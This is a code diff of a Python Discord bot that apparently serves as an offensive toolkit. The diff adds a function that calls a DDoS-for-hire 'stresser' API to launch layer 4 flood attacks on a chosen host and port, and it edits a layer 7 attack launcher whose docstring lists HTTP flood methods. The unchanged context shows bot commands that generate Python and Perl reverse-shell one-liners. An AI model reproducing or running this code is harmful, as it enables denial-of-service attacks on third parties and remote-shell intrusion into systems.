@@ -202,14 +202,6 @@ async def isUp(ctx, ip_addr=None):
     print("\n[LOGS] IP Status: ", scanner[host].state())
     await ctx.send(scanner[host].state())
 
-    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  #Create a TCP/IP socket
-    # rep = os.system('ping ' + ip_addr)
-    # if rep == 0:
-    #    print('IP Status: UP')
-    # else:
-    #    print('IP Status: DOWN')
-
-
 @bot.command()
 async def genShellPy(ctx, ip=None, port=None):
     pyBeginning = 'python -c '
@@ -229,7 +221,26 @@ async def genShellPy(ctx, ip=None, port=None):
     await ctx.send(pyBeginning + pyShell)
 
 @bot.command()
-def launch_layer7_attack(api_key, host, port, time, method, postdata=None, cookie=None, referer=None, useragent=None, req=None, delay=None, con=None):
+def stresse_layer4(api_key, host, port, time, method):
+    base_url = "https://stresse.ru/api/api.php"
+    action = "layer4"
+    url = f"{base_url}?key={api_key}&action={action}&host={host}&port={port}&time={time}&method={method}"
+
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("status"):
+                return f"Success: {data.get('body')}, Attack ID: {data.get('attack_id')}"
+            else:
+                return f"API Error: {data.get('body')}"
+        else:
+            return f"Request to the API failed with status code: {response.status_code}"
+    except Exception as e:
+        return f"Failed to connect to the API: {str(e)}"
+
+@bot.command()
+async def launch_layer7_attack(api_key, host, port, time, method, postdata=None, cookie=None, referer=None, useragent=None, req=None, delay=None, con=None):
     """
     AUTOMATION 	HTTP 	Effective method for HTTP/HTTPs
     BYPASS 	HTTP 	Effective method for HTTP/HTTPs
@@ -241,6 +252,9 @@ def launch_layer7_attack(api_key, host, port, time, method, postdata=None, cooki
     SPAMMER 	HTTP 	Powerful layer 7 attack.
     ELITE 	HTTP 	Powerful layer 7 attack.
     """
+
+    api_key = ''
+
     api_url = "https://stresse.ru/api/api.php"
     params = {
         "key": api_key,
@@ -268,7 +282,7 @@ def launch_layer7_attack(api_key, host, port, time, method, postdata=None, cooki
             return f"API Error: {response_json.get('error', 'Unknown error')}"
     else:
         return f"Your connection to API failed (Error {response.status_code}), check your connection and try again"
-
+    
 
 @bot.command()
 async def genShellPerl(ctx, ip=None, port=None):
